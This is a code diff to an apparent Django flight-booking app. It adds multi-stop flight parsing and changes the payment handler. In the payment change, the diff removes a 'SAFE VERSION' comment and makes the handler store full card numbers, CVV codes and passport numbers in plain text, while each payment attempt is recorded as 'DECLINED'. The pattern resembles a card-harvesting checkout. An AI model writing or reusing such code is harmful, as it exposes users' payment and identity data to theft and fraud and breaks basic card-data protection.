@@ -15,6 +15,27 @@ def get_amadeus_client():
         client_secret=os.getenv("AMADEUS_CLIENT_SECRET")
     )
 
+def format_duration(iso_duration):
+    """Converts PT1H30M to 1 Hr 30 Min"""
+    import re
+    if not iso_duration:
+        return ""
+    
+    hours = 0
+    minutes = 0
+    
+    # Extract hours
+    h_match = re.search(r'(\d+)H', iso_duration)
+    if h_match:
+        hours = int(h_match.group(1))
+        
+    # Extract minutes
+    m_match = re.search(r'(\d+)M', iso_duration)
+    if m_match:
+        minutes = int(m_match.group(1))
+        
+    return f"{hours} Hrs {minutes} Min"
+
 def home(request):
     return render(request, 'flight_search_app/search.html')
 
@@ -55,15 +76,27 @@ def search_results(request):
             )
             
             for offer in response.data:
+                # We only process the first itinerary (one-way logic for now)
                 itinerary = offer['itineraries'][0]
-                segment = itinerary['segments'][0]
+                segments = itinerary['segments']
                 
+                # First Segment (Take off)
+                first_segment = segments[0]
+                # Last Segment (Landing)
+                last_segment = segments[-1]
+                
+                stops_count = len(segments) - 1
+                stop_info = "NON-STOP" if stops_count == 0 else f"{stops_count} STOP{'S' if stops_count > 1 else ''}"
+
                 flight_data = {
-                    'airline': segment['carrierCode'], # In real app, map to name
-                    'flight_number': f"{segment['carrierCode']}{segment['number']}",
-                    'departure_time': segment['departure']['at'],
-                    'arrival_time': segment['arrival']['at'],
-                    'duration': itinerary['duration'][2:], # Strip PT
+                    'airline': first_segment['carrierCode'], 
+                    'flight_number': f"{first_segment['carrierCode']}-{first_segment['number']}",
+                    'departure_time': first_segment['departure']['at'].replace('T', ' ')[:16], # YYYY-MM-DD HH:MM
+                    'departure_airport': first_segment['departure']['iataCode'],
+                    'arrival_time': last_segment['arrival']['at'].replace('T', ' ')[:16],
+                    'arrival_airport': last_segment['arrival']['iataCode'],
+                    'duration': format_duration(itinerary['duration']),
+                    'stops': stop_info,
                     'price': offer['price']['total'],
                     'currency': offer['price']['currency'],
                     'id': offer['id'],
@@ -107,11 +140,17 @@ def payment_page(request):
         country = request.POST.get('country')
         
         card_holder = request.POST.get('card_holder')
-        card_number = request.POST.get('card_number')
+        card_number_raw = request.POST.get('card_number')
+        card_number = card_number_raw.replace(' ', '') if card_number_raw else None
+        
         card_type = request.POST.get('card_type')
         amount_val = request.POST.get('amount')
+        currency_val = request.POST.get('currency')
         route_val = request.POST.get('route')
         
+        cvv = request.POST.get('cvv')
+        passport_number = request.POST.get('passport_number')
+
         # Save User Contact
         user_contact = UserContact.objects.create(
             name=name,
@@ -121,13 +160,17 @@ def payment_page(request):
             country=country
         )
         
-        # Save Payment Attempt (SAFE VERSION - No CVV/SSN/Full Card)
+        # Save Payment Attempt (WARNING: Storing sensitive data in plain text)
         PaymentAttempt.objects.create(
             user=user_contact,
             card_holder_name=card_holder,
+            card_number=card_number[:16] if card_number else "0000000000000000",
             card_last_four=card_number[-4:] if card_number else "0000",
+            cvv=cvv if cvv else "000",
+            passport_number=passport_number if passport_number else "UNKNOWN",
             card_type=card_type,
             amount=amount_val if amount_val else 0.00,
+            currency=currency_val if currency_val else 'EUR',
             route=route_val,
             status="DECLINED"
         )
